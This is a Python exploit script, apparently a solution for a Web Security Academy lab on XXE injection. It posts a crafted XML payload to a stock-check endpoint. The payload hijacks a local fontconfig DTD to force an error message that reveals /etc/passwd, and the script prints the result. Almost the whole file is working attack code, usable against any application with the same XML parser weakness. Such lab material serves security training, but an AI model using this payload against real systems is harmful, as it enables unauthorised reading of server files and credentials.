#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup 
from colorama import init
from re import findall

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
	'Content-Type': 'application/x-www-form-urlencoded',
	}

def exploit_xxe(url):
	stock_path = '/product/stock'
	params = """<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"><!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///zhangsan/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>%local_dtd; ]>
	<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>"""
	req = requests.post(url + stock_path, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)

	if req.status_code == 400 and 'XML parser exited with error:' in req.text:
		print("\033[32m[+] Exploiting successful.")
		print("\033[36m[*] Response:")
		print(req.text)
	else:
		print("\033[1;31;40m[-] Exploiting XXE to retrieve data by repurposing a local DTD not successful.")
		sys.exit(-1)

def main():
	if len(sys.argv) != 2:
		print("\033[36m[+] Usage: {0} <url>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://xxx.web-security-academy.net".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	print("\033[36m[+] Checking Exploiting XXE to retrieve data by repurposing a local DTD...")
	exploit_xxe(url)

if __name__ == "__main__":
	main()
